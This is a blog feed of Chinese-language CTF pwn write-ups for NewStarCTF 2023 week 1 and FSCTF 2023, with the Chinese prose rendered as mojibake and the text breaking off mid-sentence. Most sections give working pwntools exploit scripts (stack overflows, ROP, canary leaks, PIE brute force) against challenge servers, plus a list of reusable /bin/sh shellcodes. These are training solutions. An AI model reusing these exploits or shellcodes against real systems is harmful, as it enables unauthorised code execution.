  <entry>
    <title>NewStarCTF 2023 [WEEK 1] PWN</title>
    <url>/NewStarCTF%202023%20%5BWEEK%201%5D%20PWN/</url>
    <content><![CDATA[<p>NewStarCTF 2023 [WEEK 1] PWN</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹ï¼š</span></h1><p>ç¥å¤§å®¶å›½åº†èŠ‚å¿«ä¹ï¼Œå›½åº†å°±åˆ«å†æ‰“ CTF äº†ï¼Œåˆ«å·äº†å¸ˆå‚…ä»¬ï¼Œç©ç©å§ï¼ï¼ï¼</p>
<p>ç¬¬ä¸€å‘¨çš„é¢˜ç›®ç›¸å¯¹æ¯”è¾ƒå®¹æ˜“ï¼Œpwn æ²¡æœ‰ ak æœ‰ç‚¹å¯æƒœï¼Œä¼ªéšæœºçš„éƒ¨åˆ†å¼„å¾—è¿˜ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œéœ€è¦åŠ æŠŠæ²¹</p>
<hr>
<h2><span id="ret2text">ret2text</span></h2><p>ä¸€çœ‹é¢˜ç›®å°±çŸ¥é“æ˜¯ç»å…¸æ ˆæº¢å‡ºï¼Œè€è§„çŸ©æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼Œæ‰“å¼€äº†æ ˆä¸å¯æ‰§è¡Œ NX</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/1.png"></p>
<p>IDA æŸ¥çœ‹åæ±‡ç¼–ï¼Œæ ˆæº¢å‡ºå¾ˆæ˜æ˜¾ï¼Œå¹¶ä¸”è¿˜è‡ªå¸¦åé—¨å‡½æ•°</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/2.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/3.png"></p>
<p>æœ€åå†æŸ¥çœ‹ä¸€ä¸‹éœ€è¦æº¢å‡ºå¤šå°‘å­—èŠ‚çš„åƒåœ¾æ•°æ®ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹éœ€è¦æº¢å‡ºçš„åƒåœ¾æ•°æ®å¯ä»¥åœ¨ IDA é‡Œé¢æ‰¾åˆ°ï¼‰ï¼Œgdb è°ƒè¯•ä¸€ä¸‹ï¼Œ0x80 - 0x60 &#x3D; 0x20</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/4.png"></p>
<p>ç›´æ¥æ”»å‡»å°±è¡Œï¼Œexp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26188</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">backdoor = <span class="number">0x4011FB</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(backdoor)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ezshellcode">ezshellcode</span></h2><p>ä¹Ÿæ˜¯æ¯”è¾ƒç»å…¸çš„ shellcodeï¼Œå¼€å¯ NXï¼Œå¾€æ ˆä¸Šå†™ shellcode å³å¯ï¼ˆä½†æ˜¯éœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯ shellcode çš„é•¿åº¦ï¼Œæ ¹æ®é¢˜ç›®æ¥ç¡®å®šï¼‰</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/5.png"></p>
<p>IDA åæ±‡ç¼–ä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼Œå°±æ˜¯å¾€ buf é‡Œé¢å†™å…¥ shellcode</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/6.png"></p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29928</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>ç›¸å…³çš„ shellcode å¦‚ä¸‹ï¼Œå¯ä»¥äº†è§£ä¸‹ï¼ï¼ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 32ä½ çŸ­å­—èŠ‚shellcode --&gt; 21å­—èŠ‚</span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"> </span><br><span class="line"># 32ä½ çº¯asciiå­—ç¬¦shellcode</span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"> </span><br><span class="line"># 32ä½ scanfå¯è¯»å–çš„shellcode</span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br><span class="line"> </span><br><span class="line"># 64ä½ scanfå¯è¯»å–çš„shellcode 22å­—èŠ‚</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"># 64ä½ è¾ƒçŸ­çš„shellcode  23å­—èŠ‚</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"># 64ä½ çº¯asciiå­—ç¬¦shellcode</span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="newstar-shop">newstar shop</span></h2><p>è¿™é“é¢˜å°±æ˜¯ä¸€é“æ•´å½¢æº¢å‡ºï¼Œéœ€è¦è®¤çœŸçš„ä»£ç å®¡è®¡ï¼Œå½“æ—¶åšçš„çš„æ—¶å€™æœ‰ç‚¹å‚»é€¼ï¼Œè„‘å­æ²¡æœ‰è½¬è¿‡æ¥ä¸€ç›´åœ¨æƒ³ dont_try ä¸€æ¬¡åªèƒ½ä¸€æ¬¡æ‰£ 50ï¼Œè¿™æ ·ä¸å¯èƒ½ä½¿ money è¾¾ä¸åˆ°è´Ÿæ•°ï¼Œå¿˜è®°å¯ä»¥ä¹°ä¸œè¥¿äº†æˆ‘çœŸå•¥</p>
<p>å…ˆçœ‹ä¸‹ shop()ï¼Œå¾ˆæ˜æ˜¾è‡ªå·±çš„ç›®çš„å°±æ˜¯ä½¿ç›´æ¥èµšå¤Ÿé’±å¯ä»¥ä¹°åˆ° shellï¼Œä»è€Œè¾¾åˆ° <code>cat flag</code> çš„ç›®çš„</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/7.png"></p>
<p>money å±äºæ— ç¬¦å·æ•´å‹ï¼Œè¿™é‡Œå°±è¦æƒ³åŠæ³•æº¢å‡ºæ‰èƒ½æœ‰è¶³å¤Ÿçš„é’±ä¹° shellï¼Œå¦‚æœå•é è‡ªå·±æ‰“å·¥èµšé’±çš„è¯æ ¹æœ¬ä¸å¯èƒ½ï¼Œé¢˜ç›®è¿˜è®¾ç½®äº†è‡ªå·±ä¸€å¤©çš„å·¥ä½œæ—¶é—´ï¼Œæ‰€ä»¥åªæœ‰è‡ªå·±æƒ³åŠæ³•æº¢å‡ºæ‰æ˜¯å”¯ä¸€çš„å‡ºè·¯</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/8.png"></p>
<p>é¢˜ç›®è¿˜ç»™å‚æ•°è®¾ç½®äº†ä¸€äº›åˆå§‹å€¼ï¼Œç°åœ¨çš„ä»»åŠ¡å°±æ˜¯ä½¿ money å˜æˆè´Ÿæ•°å°±å¯ä»¥è¾¾åˆ°æ•´å‹æº¢å‡º</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/9.png"></p>
<p><strong>æ€è·¯å¦‚ä¸‹ï¼š</strong>
ï¼ˆç›´æ¥ nc è¿æ¥ï¼Œç„¶åå°±æ˜¯å…ˆä¹°ä¸¤æ¬¡å•†å“ï¼Œæœ€å dont_try æ‰£ä¸€æ¬¡é’±ï¼Œå°±èƒ½è¾¾åˆ°æº¢å‡ºçš„ç›®çš„ï¼Œå†å»ä¹° shellï¼Œå°±å¯ä»¥ç›´æ¥æ‹¿ä¸‹ï¼‰</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/10.png"></p>
<hr>
<h2><span id="p1eee">p1eee</span></h2><p>æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼Œå¼€å¯äº† PIE åœ°å€éšæœºåŒ–ï¼Œæ¯æ¬¡è¿è¡Œçš„åŸºå€éƒ½ä¸ä¸€æ ·ï¼Œä½†æ˜¯ PIE ä¸ä¼šéšæœºåŒ–åœ°å€çš„ä½ 12 ä½ï¼ˆä¹Ÿå°±æ˜¯è¯´åä¸‰ä½åœ°å€æ˜¯å›ºå®šçš„ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨ partial writeï¼Œçˆ†ç ´å€’æ•°ç¬¬å››ä½ï¼Œåå…­åˆ†ä¹‹ä¸€çš„æˆåŠŸå‡ ç‡</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/11.png"></p>
<p>IDA åç¼–è¯‘ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œå¹¶ä¸”æœ‰åé—¨å‡½æ•°ï¼ˆå› ä¸ºå¼€å¯äº† PIEï¼Œåœ°å€çš„åä¸‰ä½ä¸ä¼šå˜ <code>26c</code>ï¼Œæ‰€ä»¥åªéœ€çˆ†ç ´å€’æ•°ç¬¬å››ä½ï¼‰ã€‚ç”±äºå°ç«¯åºçš„åŸå› ï¼Œæ‰€ä»¥å°±æ˜¯ <code>\x6c\x11</code>ï¼Œåé¢ <code>\x11</code> æ˜¯éšæœºçš„ï¼Œå¯ä»¥æ”¹æˆåˆ«çš„ï¼Œå¦‚ä¸‹éƒ½è¡Œï¼š</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">l<span class="attr">ist</span> <span class="operator">=</span> [<span class="string">&quot;<span class="char escape_">\x</span>01&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>11&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>21&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>31&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>41&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>51&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>61&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>71&quot;</span>,</span><br><span class="line">        <span class="string">&quot;<span class="char escape_">\x</span>81&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>91&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>a1&quot;</span>, <span class="string">&quot;<span class="char escape_">\x</span>b1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>c1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>d1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>e1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>f1&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯éœ€è¦è½¬æ¢ï¼ˆéƒ½æ˜¯å¥—è·¯ï¼‰</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/12.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/13.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/14.png"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å†™è„šæœ¬çˆ†ç ´äº†ï¼ˆè„šæœ¬æ ¼å¼é€šç”¨ï¼‰ï¼Œexp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28968</span>)</span><br><span class="line">        elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">         </span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p16(<span class="number">0x126c</span>)</span><br><span class="line">        </span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="random">Random</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26977</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"> </span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">num1 = libc.rand()</span><br><span class="line"> </span><br><span class="line">p.sendline(<span class="built_in">str</span>(num1))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h1><p>ä¼ªéšæœºéƒ¨åˆ†è¿˜ç›¸å¯¹è–„å¼±ï¼Œéœ€è¦åŠ æŠŠæ²¹ï¼Œç»•è¿‡ PIE æŒæ¡çš„å·®ä¸å¤šäº†ï¼ŒåŠ æ²¹ï¼Œå¥¥é‡Œç»™ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>NewStarCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>FSCTF 2023 PWN</title>
    <url>/FSCTF%202023%20PWN/</url>
    <content><![CDATA[<p>FSCTF 2023 PWN</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹</span></h1><p>FSCTFæ–°ç”Ÿèµ›æ˜¯ç”±ä¸­å›½æ°‘èˆªå¤§å­¦ã€å¤©æ´¥ç†å·¥å¤§å­¦ã€æ»å·å­¦é™¢ã€å‰æ—å¸ˆèŒƒå¤§å­¦ã€ä¸‰æ˜å­¦é™¢(æ’åä¸åˆ†å…ˆå)ç­‰5æ‰€é«˜æ ¡å…±åŒä¸¾åŠçš„CTFæ–°ç”Ÿèµ›ï¼Œæ¯”èµ›æ¶µç›– Webã€Pwnã€Reverseã€Cryptoã€Misc ç­‰èµ›é¢˜æ–¹å‘ã€‚é€šè¿‡æ­¤æ¬¡æ¯”èµ›ï¼Œå¸Œæœ›èƒ½å¤Ÿæé«˜å‚èµ›å¸ˆå‚…ä»¬çš„å®è·µèƒ½åŠ›ï¼Œä¿ƒè¿›è¿›ä¸€æ­¥å­¦ä¹ ç«èµ›çŸ¥è¯†çš„çƒ­æƒ…ï¼Œå¹¶ä¸ºå¤§å®¶æä¾›ä¸€ä¸ªå±•ç¤ºè‡ªæˆ‘ã€äº¤æµåˆä½œçš„å¹³å°ã€‚</p>
<p>å®Œç»“æ’’èŠ±ï¼ï¼ï¼</p>
<p>è¿™æ¬¡æ–°ç”Ÿèµ›æŒºæœ‰æ„æ€çš„ï¼ŒPWN çš„ç­¾åˆ°é¢˜ ncï¼ˆä¸çŸ¥é“æ˜¯ä¸æ˜¯çœŸçš„ç­¾åˆ° -_-ï¼‰ï¼Œåšçš„çœŸçš„ä¼šæ€€ç–‘äººç”Ÿï¼ˆä¹Ÿæ˜¯å¥½äº‹ï¼Œè¿™ä¸ªçŸ¥è¯†ç‚¹è‚¯å®šæ˜¯è‡ªå·±çš„ç›²åŒºï¼Œå­¦åˆ°äº†å­¦åˆ°äº†ï¼‰ï¼ŒWhat am I thinking?ä¹ŸæŒºæœ‰æ„æ€çš„ï¼Œæ²¡ç»™æ–‡ä»¶è®©æˆ‘ä»¬ç”¨ pwntools å»æ•´ï¼Œæ€»ä½“æ¥è¯´ï¼Œåšçš„å¾ˆå¼€å¿ƒï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼Œæ˜å¹´å†æ¥ï¼ï¼ï¼</p>
<hr>
<h2><span id="nc">nc</span></h2><p>è¿™é“é¢˜åšçš„çœŸä¼šè®©äººæ€€ç–‘è¿™çœŸçš„æ˜¯ä¸€é“ç­¾åˆ°é¢˜å—ï¼Œåšçš„äººçœŸçš„ä¼šéº»æœ¨ï¼Œä¸è¿‡çœ‹äº† WPï¼Œè¿™ä¸ªç‚¹æ˜ç™½äº†è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œä»¥ä¸‹å°±æ˜¯å¯ä»¥è·å¾— flag çš„å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 1&gt;&amp;0&amp;&amp;<span class="built_in">tac</span> fl*</span><br><span class="line"><span class="built_in">tac</span> fl*&gt;&amp;0</span><br><span class="line"><span class="built_in">tac</span> fl*&gt;&amp;2</span><br></pre></td></tr></table></figure>

<p><img src="/images/FSCTF2023PWN/1.png"></p>
<p><img src="/images/FSCTF2023PWN/2.png"></p>
<hr>
<h2><span id="rdi">rdi</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œåªæ‰“å¼€äº† NXã€‚</p>
<p><img src="/images/FSCTF2023PWN/3.png"></p>
<p>IDA ä¸€ä¸‹ï¼Œä»£ç å®¡è®¡ä¸€ä¸‹ï¼Œä½ ä¼šå‘ç°å‘ç”Ÿäº†æ ˆæº¢å‡ºï¼Œå¹¶ä¸”æœ‰ä¸ª <code>system</code>ï¼Œä½†æ˜¯æ²¡æœ‰ <code>binsh</code>ï¼Œè¿™æ ·çš„è¯å°±çœ‹ä¸‹èƒ½ä¸èƒ½å†æ‰§è¡Œæ–‡ä»¶é‡Œé¢æ‰¾åˆ° <code>sh</code>ã€‚</p>
<p><img src="/images/FSCTF2023PWN/4.png"></p>
<p><img src="/images/FSCTF2023PWN/5.png"></p>
<p><code>ROPgadget</code> æœç´¢ä¸€æ‰‹ï¼Œå‘ç°äº† <code>sh</code>ï¼ˆå’Œ <code>binsh</code> æœ‰ä¸€æ ·çš„åŠŸèƒ½ï¼‰ï¼Œè¿™æ ·å°±å¥½åŠï¼ŒçŸ¥é“ <code>system</code> å’Œ <code>sh</code>ï¼Œè¿™é¢˜å°±æ˜¯è€ƒå¯Ÿ 64 ä½ä¼ å‚çš„çŸ¥è¯†äº†ï¼ˆå¯ä»¥çœ‹ <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">[Pwn Pwn Pwn!!! æŠ€å·§ï¼ˆ1ï¼‰]</a>ï¼‰ï¼Œè¿™é¢˜æ˜¯ä¸éœ€è¦æ ˆå¹³è¡¡çš„ï¼Œç›´æ¥ä¸Š expã€‚</p>
<p><img src="/images/FSCTF2023PWN/6.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28993</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x4007d3</span></span><br><span class="line">ret_addr = <span class="number">0x400546</span></span><br><span class="line">sys_addr = <span class="number">0x4006FB</span></span><br><span class="line">bin_sh = <span class="number">0x40080d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="stackmat">stackmat</span></h2><p>è€è§„çŸ©çœ‹çœ‹ä¿æŠ¤æœºåˆ¶ï¼Œæ‰“å¼€äº† <code>canary</code> å’Œ <code>NX</code>ï¼Œæ€è·¯å°±æ¥äº†ï¼ˆæƒ³åŠæ³•æ³„éœ² canaryï¼‰ã€‚</p>
<p><img src="/images/FSCTF2023PWN/7.png"></p>
<p>IDA åæ±‡ç¼–ä¸€ä¸‹ï¼Œå‘ç°äº†æ ¼å¼å­—ç¬¦ä¸²æ¼æ´å’Œæ ˆæº¢å‡ºï¼Œè¿è¡Œç¨‹åºçœ‹çœ‹åç§»ï¼ˆç»“æœåç§»ä¸º 8ï¼‰ã€‚</p>
<p><img src="/images/FSCTF2023PWN/8.png"></p>
<p><img src="/images/FSCTF2023PWN/9.png"></p>
<p>GDB è°ƒè¯•ä¸€ä¸‹ï¼Œå‘ç° canary æ˜¯ç¬¬åä¸€ä¸ªå‚æ•°ï¼Œè¿™æ ·çš„è¯å°±å’Œæ¯”èµ›é‡Œçš„ <a href="https://xzz911.github.io/NewStarCTF%202023%20%5BWEEK%202%5D%20PWN/">NewStarCTF 2023 [WEEK 2] PWN</a> é¢˜ç›®æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œåªæ˜¯è¿™é¢˜ä¸éœ€è¦æ ˆå¹³è¡¡ï¼Œç›´æ¥å¼€å¹²ã€‚</p>
<p><img src="/images/FSCTF2023PWN/10.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28131</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401229</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%11$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;I kown you know\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="2str">2str</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œ32 ä½ç¨‹åºåªæ‰“å¼€äº† NXã€‚</p>
<p><img src="/images/FSCTF2023PWN/11.png"></p>
<p>IDA åæ±‡ç¼–ä¸€ä¸‹ï¼Œä»£ç å®¡è®¡ä½ å°±ä¼šå‘ç°ç¨‹åºæœ‰ä¸‰ç‚¹é—®é¢˜ï¼š</p>
<ol>
<li><code>v3</code> æ˜¯ä¸€ä¸ª 8 ä½çš„æ— ç¬¦å·æ•´å‹ï¼ˆå¯èƒ½éœ€è¦ç”¨åˆ°æ•´å‹æº¢å‡ºï¼‰ï¼›</li>
<li>å­˜åœ¨ä¸€ä¸ª <code>if (v3 &gt; 9)</code> è¯­å¥ï¼Œéœ€è¦ç»•è¿‡ï¼›</li>
<li>å­˜åœ¨ <code>strcpy</code> å¯¼è‡´çš„æ ˆæº¢å‡ºã€‚</li>
</ol>
<p>ä½¿ç”¨ <code>&#39;\x00&#39;</code> è™½ç„¶èƒ½ç»•è¿‡ <code>if</code>ï¼Œä½†æ— æ³•é€ æˆ <code>strcpy</code> æº¢å‡ºï¼Œæ‰€ä»¥é€šè¿‡æ•´å‹æº¢å‡ºæ¥è§£å†³é—®é¢˜ â€”â€” åˆ©ç”¨ <code>unsigned __int8</code> çš„èŒƒå›´ä¸º <code>0~255</code>ï¼Œè¾“å…¥å­—ç¬¦é•¿åº¦ä¸º <code>256~264</code> å³å¯ã€‚</p>
<p><img src="/images/FSCTF2023PWN/12.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28318</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x80492AF</span></span><br><span class="line">ret_addr = <span class="number">0x804900a</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;show me your power\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0xb9</span> + <span class="number">4</span>) + p32(backdoor)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="what-am-i-thinking">What am I thinking?</span></h2><p>è¿™é¢˜æŒºæœ‰æ„æ€çš„ï¼ˆæœ‰æ²¡æœ‰å’±å®¶é¸½é¸½çš„ç²‰ä¸ï¼‰ï¼Œæ²¡æœ‰é™„ä»¶ï¼Œæ˜¾ç„¶æ˜¯è®©ä½  <code>nc</code>ï¼Œå»å¯»æ‰¾çº¿ç´¢ã€‚</p>
<p><img src="/images/FSCTF2023PWN/13.png"></p>
<p>ä¸€å †è‹±æ–‡ï¼ˆç¿»è¯‘åç†è§£ï¼‰ï¼Œæˆ‘å¼€å§‹ä»¥ä¸ºæ˜¯ç”¨æ—¶é—´åšç§å­ç”Ÿæˆéšæœºæ•°ï¼Œä½†æ˜¯æ²¡æ–‡ä»¶å°±æ²¡æ³•è¿™ä¹ˆåšã€‚çœ‹äº† WP æ‰å‘ç°æ˜¯è€ƒå¯Ÿ <code>pwntools</code> ä½¿ç”¨ã€‚</p>
<p><img src="/images/FSCTF2023PWN/14.png"></p>
<p>æ³¨æ„ï¼š</p>
